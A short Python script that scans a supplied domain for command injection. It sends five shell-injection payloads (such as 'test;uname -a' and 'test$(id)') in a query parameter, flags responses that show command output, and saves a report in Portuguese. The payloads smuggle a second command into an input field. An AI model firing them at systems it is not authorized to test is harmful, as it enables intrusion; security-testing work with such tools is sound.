import requests
import os
from termcolor import colored
from urllib.parse import quote

def scan_command_injection(domain):
    print(f"Scanning {domain} for command injection vulnerabilities...\n")
    report = []
    found = False
    comandos = [
        "test;uname -a",
        "test&&whoami",
        "test|id",
        "test`id`",
        "test$(id)"
    ]

    for payload in comandos:
        url = f"http://{domain}/?input={quote(payload)}"
        try:
            response = requests.get(url, timeout=5)
            body = response.text.lower()

            if any(x in body for x in ["uid=", "linux", "root", "administrator"]):
                found = True
                gravidade = "ALTA"
                linha = f" - {colored(gravidade, 'red')} {url} | Payload: {payload}"
                print(linha)
                report.append(f"[{gravidade}] {url}\n    Payload: {payload}\n")

        except Exception as e:
            continue

    if found:
        print(colored("[+] Possíveis vulnerabilidades de Command Injection detectadas!", "yellow"))
        salvar_relatorio(domain, report)
    else:
        print(colored("[-] No Command Injection vulnerabilities detected.", "green"))

def salvar_relatorio(domain, report_lines):
    path = "relatorios"
    if not os.path.exists(path):
        os.makedirs(path)

    filename = os.path.join(path, f"command_injection_{domain.replace('.', '_')}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write("Relatório de Command Injection\n")
        f.write("=================================\n\n")
        for linha in report_lines:
            f.write(linha + "\n")
    print(colored(f"[+] Relatório salvo em {filename}", "cyan"))
